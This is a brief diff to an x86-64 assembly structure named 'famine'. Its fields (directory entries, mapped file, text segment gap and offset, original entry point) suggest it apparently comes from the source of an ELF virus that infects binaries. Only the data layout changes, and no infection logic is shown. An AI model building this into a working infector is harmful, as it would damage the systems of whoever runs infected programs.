@@ -75,18 +75,15 @@ endstruc
 ; FAMINE structure
 struc	famine
 	.dirents:		resb	DIRENTS_BUFF_SIZE
-	.fd:			resd	1
+	.total_dreclen:	resq	1
 	.map_ptr:		resq	1
-	.fsize:			resd	1
-	.payload_size:	resq	1
 	.gap_size:		resq	1
 	.txt_offset:	resq	1
 	.txt_filesz:	resq	1
 	.txt_vaddr:		resq	1
 	.next_offset:	resq	1
 	.orig_entry:	resq	1
-	.payload_off:	resq	1
-	.old_pwd:		resb	PATH_MAX
+	.current_fpath:	resb	PATH_MAX
 endstruc
 
 
